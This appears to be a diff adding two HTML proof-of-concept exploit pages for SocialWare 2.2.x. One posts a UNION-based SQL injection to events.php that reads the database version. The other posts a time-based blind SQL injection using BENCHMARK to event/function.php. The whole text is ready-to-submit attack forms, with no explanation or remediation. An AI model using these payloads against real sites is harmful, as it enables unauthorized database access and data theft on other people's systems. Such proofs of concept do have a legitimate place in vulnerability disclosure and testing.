@@ -1,0 +1,25 @@
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;PoC - SocialWare 2.2.x SQL Injection&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;form method=&quot;POST&quot; action=&quot;http://www.example.com/path/events.php?action=show&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;-1 UNION SELECT 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29&quot;&gt;
+            &lt;input type=&quot;submit&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+
+
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;PoC - SocialWare 2.2.x Blind SQL Injection&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;form method=&quot;POST&quot; action=&quot;http://www.example.com/path/event/function.php&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;create2&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;Id&quot; value=&quot;-1 OR (SELECT(IF(ASCII(0x41) = 65,BENCHMARK(999999999,NULL),NULL)))&quot;&gt;
+            &lt;input type=&quot;submit&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
